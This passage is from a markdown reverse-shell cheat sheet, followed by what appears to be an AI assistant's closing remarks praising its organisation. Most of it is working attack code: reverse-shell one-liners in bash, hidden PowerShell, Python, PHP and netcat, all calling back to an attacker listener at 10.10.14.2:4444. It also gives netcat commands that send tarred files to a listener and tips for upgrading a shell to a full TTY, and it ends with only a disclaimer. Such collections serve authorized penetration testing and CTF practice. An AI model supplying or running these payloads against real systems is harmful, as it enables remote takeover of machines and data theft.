nc -lvnp 4444 > received.zip
```

### Listener with Compression
```bash
# Send compressed
tar czvf - /path/to/files | nc -lvnp 4444

# Receive and decompress
nc -lvnp 4444 | tar xzvf -
```

### Listener with Auto-Reconnect Detection
```python
import socket
import time

def listener_with_reconnect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 4444))
    s.listen(5)
    
    while True:
        try:
            conn, addr = s.accept()
            print(f"Connection from {addr}")
            while True:
                data = conn.recv(1024)
                if not data: break
                conn.sendall(b"OK\n")
        except:
            print("Connection lost, waiting...")
            time.sleep(5)
            continue

if __name__ == "__main__":
    listener_with_reconnect()
```

---

## Common Issues & Fixes

### Shell Dies Immediately
```bash
nohup bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' &
```

### No /bin/bash
```bash
/bin/sh -i >& /dev/tcp/10.10.14.2/4444 0>&1
```

### No Python
```bash
which python3 && python3 -c 'import pty; pty.spawn("/bin/bash")'
which script && script /dev/null -c bash
```

### TTY Not Working
```bash
exec /bin/bash
```

### Job Control Disabled
```bash
set +m
```

### Fix Tab Completion
```bash
export SHELL=/bin/bash
```

### Fix Arrow Keys
```bash
export TERM=xterm
```

### Shell Upgrade Through SSH
```bash
ssh -o "ProxyCommand=nc -X connect -x 10.10.14.2:4444 %h %p" user@target
```

### Shell Upgrade Through Telnet
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Shell Upgrade Through Netcat
```bash
/bin/sh -i
/usr/bin/script -q /dev/null
```

---

## Quick Reference

### Common Variables to Change
| Variable | Description |
|----------|-------------|
| `10.10.14.2` | Your listener IP |
| `4444` | Your listener port |
| `/bin/sh` | Shell to spawn |
| `cmd.exe` | Windows shell |

### Most Common One-Liners

#### Linux
```bash
bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```

#### Windows (PowerShell)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

#### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### PHP
```bash
php -r '$sock=fsockopen("10.10.14.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Netcat
```bash
nc -e /bin/sh 10.10.14.2 4444
```

### Full TTY One-Liner
```bash
python -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg && export TERM=xterm && export SHELL=/bin/bash && export PS1='\u@\h:\w\$ ' && stty rows 50 cols 100
```

### Essential Listening Command
```bash
nc -lvnp 4444
```

---

## Legal Disclaimer
**⚠️ IMPORTANT**: This collection is for educational and authorized testing purposes only. Use these techniques only on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal and punishable by law. Always obtain proper authorization before conducting any security testing.

---

**End of Reverse Shell Collection**
```

This organized markdown document features:

1. **Working Table of Contents** - Each item links directly to its section
2. **Clear Categorization** - All shells grouped by language/protocol
3. **Progressive Organization** - From basic to advanced techniques
4. **Consistent Formatting** - Same structure throughout
5. **Quick Reference** - Fast access to most common commands
6. **Troubleshooting Section** - Common issues and solutions
7. **Legal Disclaimer** - Important ethical reminder

To use the table of contents, simply click any link and it will jump to that section automatically in any markdown viewer (GitHub, VSCode, Obsidian, etc.).
